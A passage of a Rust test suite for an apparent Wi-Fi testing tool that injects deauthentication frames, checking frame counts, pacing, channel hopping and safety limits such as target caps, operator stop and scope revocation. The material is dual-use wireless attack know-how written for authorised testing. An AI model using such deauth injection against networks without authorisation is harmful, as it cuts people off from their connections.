        pacer.advance_frame(50_000);
        assert!(!pacer.frame_ready(50_019));
        assert!(pacer.frame_ready(50_020));
        // Bursts gate on their own interval.
        assert!(pacer.burst_ready(0));
        pacer.advance_burst(0);
        assert!(!pacer.burst_ready(MIN_BURST_INTERVAL_MS - 1));
        assert!(pacer.burst_ready(MIN_BURST_INTERVAL_MS));
    }

    #[test]
    fn deauth_plan_validation_refuses_bad_counts_and_identities() {
        assert!(validate_deauth_plan(&[], 1, 1).is_err());
        assert!(validate_deauth_plan(&[AP; MAX_DEAUTH_TARGETS + 1], 1, 1).is_err());
        assert!(validate_deauth_plan(&[AP], 0, 1).is_err());
        assert!(validate_deauth_plan(&[AP], MAX_DEAUTH_BURSTS + 1, 1).is_err());
        assert!(validate_deauth_plan(&[AP], 1, 0).is_err());
        assert!(validate_deauth_plan(&[AP], 1, MAX_FRAMES_PER_BURST + 1).is_err());
        let multicast = [0x03, 0x00, 0x00, 0x00, 0x00, 0x01];
        assert!(validate_deauth_plan(&[multicast], 1, 1).is_err());
        assert!(validate_deauth_plan(&[AP, AP], 1, 1).is_err(), "no duplicates");
        // The per-burst cap spans all targets: 4 x 9 = 36 > 32 refuses,
        // 4 x 8 = 32 exactly fits.
        let four: Vec<[u8; 6]> = (0..4u8)
            .map(|i| [0x02, 0x00, 0x00, 0x00, 0x00, i])
            .collect();
        let over = validate_deauth_plan(&four, 1, 9).unwrap_err();
        assert!(over.message.contains("at most 32 deauth frames"), "{over}");
        assert!(validate_deauth_plan(&four, 1, 8).is_ok());
        assert!(validate_deauth_plan(&[AP], 2, 8).is_ok());
    }

    #[test]
    fn run_deauth_loop_sends_the_exact_bounded_frame_count() {
        // 2 targets x 3 frames x 2 bursts = 12 frames, half per target.
        let stop = AtomicBool::new(false);
        let counter = AtomicU64::new(0);
        let mut clock = FakeClock { now: 0 };
        let sent: Arc<std::sync::Mutex<Vec<Vec<u8>>>> = Arc::default();
        let log = Arc::clone(&sent);
        let mut send = move |frame: &[u8]| -> Result<(), WifiError> {
            log.lock().expect("log lock").push(frame.to_vec());
            Ok(())
        };
        let outcome = run_deauth_loop(
            &[AP, OTHER_AP],
            2,
            3,
            OUR,
            &stop,
            &|| true,
            &mut clock,
            &counter,
            &mut send,
        )
        .expect("plan valid");
        assert_eq!(outcome.end_reason, DeauthEndReason::Completed);
        assert_eq!(outcome.frames_sent, 12);
        assert_eq!(outcome.bursts_completed, 2);
        assert_eq!(outcome.error, None);
        assert_eq!(counter.load(Ordering::Acquire), 12);
        let log = sent.lock().expect("log lock");
        let ap_frames = log
            .iter()
            .filter(|f| f[TX_RADIOTAP_LEN + 4..TX_RADIOTAP_LEN + 10] == AP)
            .count();
        let other_frames = log
            .iter()
            .filter(|f| f[TX_RADIOTAP_LEN + 4..TX_RADIOTAP_LEN + 10] == OTHER_AP)
            .count();
        assert_eq!(ap_frames, 6);
        assert_eq!(other_frames, 6);
        // Every logged frame carries the radiotap prefix and our transmitter.
        assert!(log
            .iter()
            .all(|f| f[..TX_RADIOTAP_LEN] == tx_radiotap_prefix()
                && f[TX_RADIOTAP_LEN + 10..TX_RADIOTAP_LEN + 16] == OUR));
        // Frames are spaced by MIN_FRAME_INTERVAL_MS and bursts by
        // MIN_BURST_INTERVAL_MS: 12 frames in 2 bursts -> 10 intra-burst
        // frame gaps + 1 burst gap.
        let expected_span = (12 - 2) * MIN_FRAME_INTERVAL_MS + MIN_BURST_INTERVAL_MS;
        assert_eq!(clock.now_ms(), expected_span);
    }

    #[test]
    fn operator_stop_mid_run_ends_with_the_honest_reason_and_no_extra_frame() {
        let stop = Arc::new(AtomicBool::new(false));
        let stop_flag = Arc::clone(&stop);
        let counter = AtomicU64::new(0);
        let mut clock = FakeClock { now: 0 };
        let mut sends = 0u64;
        let mut send = move |_frame: &[u8]| -> Result<(), WifiError> {
            sends += 1;
            // The operator hits stop right after the fifth frame.
            if sends == 5 {
                stop_flag.store(true, Ordering::Release);
            }
            Ok(())
        };
        let outcome = run_deauth_loop(
            &[AP],
            4,
            8,
            OUR,
            &stop,
            &|| true,
            &mut clock,
            &counter,
            &mut send,
        )
        .expect("plan valid");
        assert_eq!(outcome.end_reason, DeauthEndReason::OperatorStop);
        assert_eq!(outcome.frames_sent, 5, "no frame leaves after the stop");
        assert_eq!(counter.load(Ordering::Acquire), 5);
    }

    #[test]
    fn scope_revocation_mid_run_ends_the_run_immediately() {
        let stop = AtomicBool::new(false);
        let scope_flag = Arc::new(AtomicBool::new(true));
        let flag = Arc::clone(&scope_flag);
        let counter = AtomicU64::new(0);
        let mut clock = FakeClock { now: 0 };
        let mut sends = 0u64;
        let mut send = move |_frame: &[u8]| -> Result<(), WifiError> {
            sends += 1;
            if sends == 3 {
                flag.store(false, Ordering::Release);
            }
            Ok(())
        };
        let scope = || scope_flag.load(Ordering::Acquire);
        let outcome = run_deauth_loop(&[AP], 4, 8, OUR, &stop, &scope, &mut clock, &counter, &mut send)
            .expect("plan valid");
        assert_eq!(outcome.end_reason, DeauthEndReason::ScopeRevoked);
        assert_eq!(outcome.frames_sent, 3);
    }

    #[test]
    fn the_hard_runtime_cap_auto_stops_a_stalled_run() {
        let stop = AtomicBool::new(false);
        let counter = AtomicU64::new(0);
        let mut clock = StallClock { now: 0 };
        let mut send = |_frame: &[u8]| -> Result<(), WifiError> { Ok(()) };
        let outcome = run_deauth_loop(&[AP], MAX_DEAUTH_BURSTS, MAX_FRAMES_PER_BURST, OUR, &stop, &|| true, &mut clock, &counter, &mut send)
            .expect("plan valid");
        assert_eq!(outcome.end_reason, DeauthEndReason::RuntimeCapReached);
        assert!(outcome.frames_sent < 32, "auto-stopped, not completed");
        assert!(clock.now_ms() >= MAX_DEAUTH_RUN_MS);
    }

    #[test]
    fn send_failure_mid_run_ends_with_the_send_failure_reason() {
        let stop = AtomicBool::new(false);
        let counter = AtomicU64::new(0);
        let mut clock = FakeClock { now: 0 };
        let mut sends = 0u64;
        let mut send = move |_frame: &[u8]| -> Result<(), WifiError> {
            sends += 1;
            if sends > 2 {
                return Err(WifiError::new(WifiMonitorError::Io, "interface went down"));
            }
            Ok(())
        };
        let outcome = run_deauth_loop(&[AP], 2, 8, OUR, &stop, &|| true, &mut clock, &counter, &mut send)
            .expect("plan valid");
        assert_eq!(outcome.end_reason, DeauthEndReason::SendFailure);
        assert_eq!(outcome.frames_sent, 2);
        assert_eq!(
            outcome.error.map(|e| e.code),
            Some(WifiMonitorError::Io)
        );
        assert_eq!(counter.load(Ordering::Acquire), 2);
    }

    #[test]
    fn deauth_loop_refuses_invalid_plans_and_transmitters_without_sending() {
        let stop = AtomicBool::new(false);
        let counter = AtomicU64::new(0);
        let mut clock = FakeClock { now: 0 };
        let mut sends = 0u64;
        let mut send = |_frame: &[u8]| -> Result<(), WifiError> {
            sends += 1;
            Ok(())
        };
        // Empty plan, oversized plan, zero transmitter: refusal before the
        // first send, no OS traffic.
        assert!(run_deauth_loop(&[], 1, 1, OUR, &stop, &|| true, &mut clock, &counter, &mut send).is_err());
        assert!(run_deauth_loop(&[AP], 9, 1, OUR, &stop, &|| true, &mut clock, &counter, &mut send).is_err());
        let zero = [0u8; 6];
        assert!(run_deauth_loop(&[AP], 1, 1, zero, &stop, &|| true, &mut clock, &counter, &mut send).is_err());
        assert_eq!(sends, 0);
        assert_eq!(counter.load(Ordering::Acquire), 0);
    }

    #[test]
    fn channel_hop_scheduler_walks_the_bounded_sequence_and_wraps() {
        let mut scheduler = ChannelHopScheduler::new(vec![2412, 2437, 2462], 250)
            .expect("valid hop plan");
        assert_eq!(scheduler.current(), 2412);
        assert_eq!(scheduler.channels(), &[2412, 2437, 2462]);
        assert_eq!(scheduler.interval_ms(), 250);
        assert!(!scheduler.is_paused());
        // No hop before the first interval; then the sequence wraps.
        assert_eq!(scheduler.tick(249), None);
        assert_eq!(scheduler.tick(250), Some(2437));
        assert_eq!(scheduler.tick(500), Some(2462));
        assert_eq!(scheduler.tick(750), Some(2412));
        assert_eq!(scheduler.hops(), 3);
        let log = scheduler.hop_log();
        assert_eq!(log.len(), 3);
        assert_eq!(log[0], HopEntry { at_ms: 250, from_mhz: 2412, to_mhz: 2437 });
        assert_eq!(log[2], HopEntry { at_ms: 750, from_mhz: 2462, to_mhz: 2412 });
        // A stalled caller never owes a burst: the next hop is one interval
        // from NOW, not from the overdue deadline.
        assert_eq!(scheduler.tick(9_000_000), Some(2437));
        assert_eq!(scheduler.tick(9_000_100), None);
        assert_eq!(scheduler.tick(9_000_250), Some(2462));
    }

    #[test]
    fn hop_pause_freezes_and_resume_rearms_without_a_catchup_burst() {
        let mut scheduler = ChannelHopScheduler::new(vec![2412, 2437], 500).expect("valid plan");
        scheduler.pause();
        assert!(scheduler.is_paused());
        // Hops never fire while paused, however long the pause lasts.
        assert_eq!(scheduler.tick(1_000_000), None);
        // Resume re-arms from NOW: the first hop is a full interval away.
        scheduler.resume(1_000_000);
        assert!(!scheduler.is_paused());
        assert_eq!(scheduler.tick(1_000_499), None);
        assert_eq!(scheduler.tick(1_000_500), Some(2437));
        assert_eq!(scheduler.hop_log().len(), 1);
        // Resuming while not paused is a no-op (the schedule is untouched);
        // an overdue tick fires exactly ONE hop and re-arms from now — never
        // a multi-hop catch-up burst.
        scheduler.resume(2_000_000);
        assert_eq!(scheduler.tick(2_000_400), Some(2412));
        assert_eq!(scheduler.tick(2_000_400), None);
        assert_eq!(scheduler.tick(2_000_899), None);
        assert_eq!(scheduler.tick(2_000_900), Some(2437));
    }

    #[test]
    fn hop_plan_validation_refuses_oversized_offband_duplicate_and_bad_intervals() {
        // 5 GHz steps stay inside the 5160..=5885 band for all 16 entries.
        let channels: Vec<u32> = (0..MAX_HOP_CHANNELS as u32).map(|i| 5160 + i * 5).collect();
        assert!(validate_hop_channels(&channels).is_ok());
        let oversized: Vec<u32> = (0..=MAX_HOP_CHANNELS as u32).map(|i| 5160 + i * 5).collect();
        let err = validate_hop_channels(&oversized).unwrap_err();
        assert!(err.message.contains("1..=16"), "{err}");
        assert!(validate_hop_channels(&[]).is_err());
        let offband = validate_hop_channels(&[4_000]).unwrap_err();
        assert!(offband.message.contains("outside the supported Wi-Fi bands"), "{offband}");
        assert!(validate_hop_channels(&[2437, 2437]).is_err(), "no duplicates");
        assert!(validate_hop_interval_ms(249).is_err());
        assert!(validate_hop_interval_ms(250).is_ok());
        assert!(validate_hop_interval_ms(2_000).is_ok());
        assert!(validate_hop_interval_ms(2_001).is_err());
        assert!(ChannelHopScheduler::new(vec![2412], 100).is_err());
        assert!(ChannelHopScheduler::new(Vec::new(), 500).is_err());
    }

    #[test]
    fn the_hop_log_is_bounded_at_256_entries_with_oldest_eviction() {
        let mut scheduler = ChannelHopScheduler::new(vec![2412, 2437], MIN_HOP_INTERVAL_MS)
            .expect("valid plan");
        let mut now = 0u64;
        for index in 0..(MAX_HOP_LOG + 20) as u64 {
            now += MIN_HOP_INTERVAL_MS;
            let _ = scheduler.tick(now);
            assert_eq!(scheduler.hop_log().len(), usize::min((index + 1) as usize, MAX_HOP_LOG));
        }
        let log = scheduler.hop_log();
        assert_eq!(log.len(), MAX_HOP_LOG);
        // The oldest entries were evicted; the newest is the last tick.
        assert_eq!(log.last().expect("non-empty log").at_ms, now);
    }

    #[test]
    fn injection_is_a_linux_only_door_and_the_entry_point_is_preflight_gated() {
        assert_eq!(injection_supported(), cfg!(target_os = "linux"));
        // Preflight: an already-stopped run is an honest zero-frame outcome.
        let stop = AtomicBool::new(true);
        let counter = AtomicU64::new(0);
        let outcome = run_wifi_deauth("lo", &[AP], 1, 1, &stop, &|| true, &counter)
            .expect("cancelled preflight is an outcome, not an error");
        assert_eq!(outcome.end_reason, DeauthEndReason::OperatorStop);
        assert_eq!(outcome.frames_sent, 0);
        // A revoked scope aborts before any transmission too.
        let stop = AtomicBool::new(false);
        let outcome = run_wifi_deauth("lo", &[AP], 1, 1, &stop, &|| false, &counter)
            .expect("revoked preflight is an outcome, not an error");
        assert_eq!(outcome.end_reason, DeauthEndReason::ScopeRevoked);
        assert_eq!(outcome.frames_sent, 0);
        // Bad plans refuse everywhere, before the platform check.
        let stop = AtomicBool::new(false);
        assert!(run_wifi_deauth("lo", &[], 1, 1, &stop, &|| true, &counter).is_err());
        assert!(run_wifi_deauth("lo", &[AP], 9, 1, &stop, &|| true, &counter).is_err());
    }

    #[test]
    #[cfg(not(target_os = "linux"))]
    fn injection_reports_unsupported_off_linux_after_preflight() {
        let stop = AtomicBool::new(false);
        let counter = AtomicU64::new(0);
        let err = run_wifi_deauth("lo0", &[AP], 1, 1, &stop, &|| true, &counter)
            .expect_err("no transmit door off Linux");
        assert_eq!(err.code, WifiMonitorError::Unsupported);
        assert!(err.message.contains("requires Linux"));
        // The frame builders stay pure and testable everywhere.
        assert!(inject_frame(AP, OUR, 7).is_ok());
    }

    #[test]
    #[cfg(target_os = "linux")]
    fn a_bad_interface_refuses_with_the_honest_device_error() {
        let stop = AtomicBool::new(false);
        let counter = AtomicU64::new(0);
        let err = run_wifi_deauth("definitely-not-an-interface", &[AP], 1, 1, &stop, &|| true, &counter)
            .expect_err("unknown interface refuses");
        assert_eq!(err.code, WifiMonitorError::Device);
    }
}
